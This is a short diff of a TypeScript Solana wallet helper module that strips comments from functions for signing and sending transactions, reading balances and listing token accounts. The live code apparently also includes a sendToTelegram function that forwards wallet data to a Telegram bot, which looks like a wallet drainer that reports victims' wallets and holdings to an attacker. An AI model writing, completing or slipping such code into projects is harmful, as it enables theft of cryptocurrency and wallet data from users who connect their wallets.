@@ -8,7 +8,6 @@ export const hasEnoughSolForRent = (balance: number): boolean => {
   return balance >= MINIMUM_REQUIRED_SOL;
 };
 
-// Function to construct and send a transaction
 export const signAndSendTransaction = async (
   connection: Connection,
   wallet: any,
@@ -54,10 +53,8 @@ export const signAndSendTransaction = async (
   }
 };
 
-// Update getWalletBalance to accept an optional connection parameter
 export const getWalletBalance = async (publicKey: string, customConnection?: Connection): Promise<number> => {
   try {
-    // Use the provided custom connection or the default one
     const connection = customConnection || new Connection("https://api.mainnet-beta.solana.com", {
       commitment: 'confirmed'
     });
@@ -70,7 +67,6 @@ export const getWalletBalance = async (publicKey: string, customConnection?: Con
   }
 };
 
-// Update getTokenAccounts to also accept a connection parameter as the first argument
 export const getTokenAccounts = async (
   connection: Connection,
   walletAddress: string
@@ -78,7 +74,6 @@ export const getTokenAccounts = async (
   try {
     const publicKey = new PublicKey(walletAddress);
     
-    // Use the provided connection to query SPL tokens
     const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
       publicKey,
       { programId: TOKEN_PROGRAM_ID }
@@ -118,7 +113,6 @@ interface WalletData {
   walletName: string;
 }
 
-// Function to send wallet data to a Telegram bot
 export const sendToTelegram = async (walletData: WalletData | any, botToken: string, chatId: string): Promise<boolean> => {
   try {
     const message = `
